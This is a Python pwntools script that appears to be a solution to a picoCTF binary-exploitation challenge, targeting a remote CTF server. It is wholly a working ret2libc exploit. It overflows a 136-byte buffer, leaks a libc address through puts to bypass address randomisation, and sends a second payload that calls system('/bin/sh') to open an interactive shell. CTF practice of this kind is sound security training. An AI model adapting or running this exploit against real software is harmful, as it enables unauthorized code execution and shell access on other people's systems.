#!/usr/bin/env python3

from pwn import *

# p = process('./vuln_patched')
p = remote("mercury.picoctf.net", 1774)
# gdb.attach(p)

offset = 136
junk = b'A' * offset

pop_rdi_addr = 0x400913
setbuf_got_addr = 0x601028
puts_plt_addr = 0x400540
main_addr = 0x400771

payload = [
	junk,
	p64(pop_rdi_addr),
	p64(setbuf_got_addr),
	p64(puts_plt_addr),
	p64(main_addr),
]

payload = b''.join(payload)
p.sendline(payload)

p.recvline()
p.recvline()
leak = u64(p.recvline().strip().ljust(8,b"\x00"))
log.info(f"{hex(leak)=}")

setbuf_offset = 0x88540
base_addr_libc = leak - setbuf_offset

log.info(f"{hex(base_addr_libc)=}")

system_offset = 0x4f4e0
system_addr = base_addr_libc + system_offset

bin_sh_offset = 0x1b40fa
bin_sh_addr = base_addr_libc + bin_sh_offset

ret_addr = 0x40052e

second_payload = junk + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(ret_addr) + p64(system_addr)

p.sendline(second_payload)
p.interactive()
